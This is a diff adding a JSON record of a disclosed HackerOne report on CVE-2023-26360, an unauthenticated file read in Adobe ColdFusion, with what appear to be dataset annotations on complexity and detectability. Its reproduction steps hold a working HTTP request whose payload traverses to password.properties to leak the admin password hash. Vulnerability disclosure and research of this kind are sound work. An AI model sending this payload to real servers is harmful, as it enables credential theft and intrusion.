@@ -1,0 +1,48 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "r00tdaddy ",
+  "title": "Unauthenticated File Read Adobe ColdFusion",
+  "content": "\nUnauthenticated Arbitrary File Read vulnerability due to de serialization of untrusted data in Adobe ColdFusion.\nImpact\nThe impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nThe vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier\nCVE Numbers\nCVE-2023-26360\nSteps to Reproduce\nPOST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1\nHost: \u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nConnection: close\nContent-Length: 121\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate, br\n_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d\nPassword hash is disclosed in the response:\nSuggested Mitigation/Remediation Actions\nApply the necessary security patches or updates provided by Adobe to fix the vulnerability.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1703197980,
+  "report_url": "https://hackerone.com/reports/2248781",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to `/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo` with the specified payload."
+    ],
+    [
+      2,
+      "Observe the response to extract sensitive data such as password hashes."
+    ]
+  ],
+  "vuln_description": "Unauthenticated Arbitrary File Read vulnerability in Adobe ColdFusion due to deserialization of untrusted data, allowing unauthorized access to sensitive data.",
+  "reason": "The attack involves a straightforward exploitation of a deserialization flaw with a crafted HTTP request. There are no complex interactions or state manipulations required, and the vulnerability follows a common pattern seen in similar applications.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true
+  }
+}
